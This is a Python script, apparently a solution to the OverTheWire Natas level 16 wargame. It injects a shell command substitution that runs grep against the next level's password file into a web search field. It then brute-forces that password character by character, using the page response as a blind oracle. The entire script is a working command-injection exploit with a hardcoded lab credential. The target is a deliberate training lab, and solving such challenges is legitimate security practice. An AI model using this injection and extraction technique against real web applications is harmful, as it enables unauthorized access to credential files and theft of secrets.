import requests
from string import ascii_letters, digits

url = "http://natas16.natas.labs.overthewire.org"
username = "natas16"
password = "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"

def brute_force_chars():
    charset = ascii_letters + digits
    found_password = ""

    while True:
        for char in charset:
            test_password = found_password + char
            payload = f"$(grep ^{test_password} /etc/natas_webpass/natas17)a"

            response = requests.get(
                url,
                auth=(username, password),
                params={"needle": payload, "submit": "Search"}
            )

            if "African" not in response.text:
                found_password += char
                print(f"[+] Password so far: {found_password}")
                break
        else:
            print("[+] Password found:", found_password)
            return

if __name__ == "__main__":
    brute_force_chars()
